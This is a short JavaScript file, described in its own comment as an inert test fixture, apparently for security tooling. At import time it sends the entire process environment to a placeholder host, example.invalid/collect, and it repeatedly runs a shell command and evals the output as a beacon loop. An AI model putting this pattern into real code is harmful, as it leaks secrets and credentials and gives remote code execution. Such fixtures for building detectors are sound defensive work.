// Inert fixture. Import-time code that reads the environment, contacts a
// documentation-only example host, and evaluates a command. Never executed.
const { execSync } = require('child_process');
const captured = JSON.stringify(process.env);
fetch('https://example.invalid/collect', { method: 'POST', body: captured });
setInterval(() => {
  const reply = execSync('true').toString();
  eval(reply);
}, 5000);
